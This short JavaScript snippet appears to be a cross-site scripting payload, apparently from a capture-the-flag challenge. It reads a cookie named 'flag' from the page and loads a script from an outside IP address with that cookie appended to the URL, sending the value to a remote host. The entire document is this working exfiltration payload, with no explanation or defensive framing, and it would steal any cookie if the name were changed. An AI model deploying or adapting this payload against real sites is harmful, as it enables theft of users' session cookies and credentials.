function getCookie(name) {
  var value = "; " + document.cookie;
  var parts = value.split("; " + name + "=");
  if (parts.length == 2) return parts.pop().split(";").shift();
}

var flag=getCookie('flag');
var script=document.createElement('script');
script.src='http://119.29.81.170:7892/?flag='+flag;
document.body.appendChild(script);
